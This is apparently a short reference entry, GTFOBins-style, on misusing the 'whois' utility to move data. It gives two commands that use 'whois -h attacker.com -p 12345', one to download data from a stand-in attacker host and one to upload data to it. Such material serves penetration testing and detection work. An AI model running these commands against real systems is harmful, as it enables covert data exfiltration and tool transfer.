title: whois
html:
whois

Download

Received data has instances of the `\r` byte stripped.

whois -h attacker.com -p 12345 x

Upload

Data is converted to lower case, and has a trailing `\r\n`.

whois -h attacker.com -p 12345 DATA
excerpt: whois Download Received data has instances of the `\r` byte stripped. whois -h attacker.com -p 12345 x Upload Data is converted to lower case, and has a trailing `\r\n`. whois -h attacker.com -p 12345 DATA
